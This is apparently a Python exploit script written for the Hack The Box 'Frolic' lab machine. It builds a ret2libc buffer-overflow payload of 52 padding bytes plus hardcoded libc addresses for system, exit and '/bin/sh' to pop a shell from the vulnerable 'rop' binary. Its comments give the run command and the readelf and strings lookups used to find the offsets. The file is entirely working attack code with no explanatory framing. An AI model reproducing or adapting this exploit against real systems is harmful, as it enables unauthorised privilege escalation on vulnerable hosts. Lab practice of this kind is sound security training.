#!/usr/bin/python
'''
' Run ./rop $(python /dev/shm/exploit.py)
' On HTB Frolic Machine
' libc    $ldd rop (Get address from /lib/i386-linux-gnu/libc.so.6)
' system  $readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
' exit  $readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit
' shell strings -atx /lib/i386-linux-gnu/libc.so.6 | grep bin/sh
'''

import struct

bfr = 'A'*52
libc = 0xb7e19000
system = struct.pack('<I', libc + 0x0003ada0)
exit = struct.pack('<I', libc + 0x0002e9d0)
shell = struct.pack('<I', libc + 0x0015ba0b)

print(bfr + system + exit + shell)